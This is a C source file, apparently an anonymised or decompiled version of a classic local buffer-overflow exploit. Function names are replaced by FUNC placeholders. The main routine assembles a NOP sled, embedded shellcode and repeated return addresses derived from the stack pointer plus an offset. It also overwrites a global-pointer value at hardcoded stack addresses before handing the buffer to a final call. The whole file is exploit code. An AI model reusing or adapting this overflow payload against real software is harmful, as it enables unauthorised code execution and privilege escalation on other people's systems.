#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */

/* Variables and functions */
 int ADDRS ; 
 int ALIGN ; 
 int ALIGN2 ; 
 int BUFSIZE ; 
 int OFFS ; 
 char* asmcode ; 
 int FUNC0 (char*) ; 
 int /*<<< orphan*/  FUNC1 (int) ; 
 int /*<<< orphan*/  FUNC2 (int /*<<< orphan*/ ) ; 
 scalar_t__ jump ; 
 char* FUNC3 (int) ; 
 int /*<<< orphan*/  FUNC4 (char*,char*,int) ; 
 char* nop ; 
 int /*<<< orphan*/  FUNC5 (char*,...) ; 
 int /*<<< orphan*/  FUNC6 (char*) ; 
 int /*<<< orphan*/  stdout ; 
 int /*<<< orphan*/  FUNC7 (char*,char*) ; 
 int FUNC8 (char*) ; 
 unsigned long FUNC9 () ; 
 unsigned long FUNC10 () ; 

FUNC11(int argc, char *argv[]) {
  char *buf, *ptr, addr[8];
  int offs=OFFS, bufsize=BUFSIZE, addrs=ADDRS, align=ALIGN;
  int i, noplen=FUNC8(nop);

  if (argc >1) bufsize=FUNC0(argv[1]);
  if (argc >2) offs=FUNC0(argv[2]);
  if (argc >3) addrs=FUNC0(argv[3]);
  if (argc >4) align=FUNC0(argv[4]);

  if (bufsize<FUNC8(asmcode)) {
    FUNC5("bufsize too small, code is %d bytes long\n", FUNC8(asmcode));
    FUNC1(1);
  }
  if ((buf=FUNC3(bufsize+(ADDRS<<2)+noplen+1))==NULL) {
    FUNC5("Can't malloc\n");
    FUNC1(1);
  }

  *(int *)addr=(*(unsigned long(*)())jump)()+offs;
  FUNC5("address=%p\n",*(int *)addr);

  FUNC7(buf,nop);
  ptr=buf+noplen;
  buf+=4-align;
  for(i=0;i<bufsize;i++)
   *ptr++=nop[i%noplen];
  FUNC4(ptr-FUNC8(asmcode),asmcode,FUNC8(asmcode));
  for(i=0;i<(addrs<<2);i++)
   *ptr++=addr[i%sizeof(int)];
  *ptr=0;

  FUNC5("buflen=%d\n", FUNC8(buf));
  FUNC2(stdout);

  ptr-=addrs<<2;
  *(int *)addr+=(0x7fff350c-0x7fff31e8)+(4*100)+ALIGN2;
  for(i=0;i<64;i++)
   *ptr++=addr[i&3];


/* gp value is set here */
  ptr=buf+ALIGN+(0x7fff2f00-0x7fff2ce8)-24;
  *(int *)addr=(*(unsigned long(*)())jump)()+OFFS+(0x7fff350c-0x7fff31e8-4)+ALIGN2+32+32412;

  for(i=0;i<64;i++)
   *ptr++=addr[i&3];

  FUNC6(buf);
}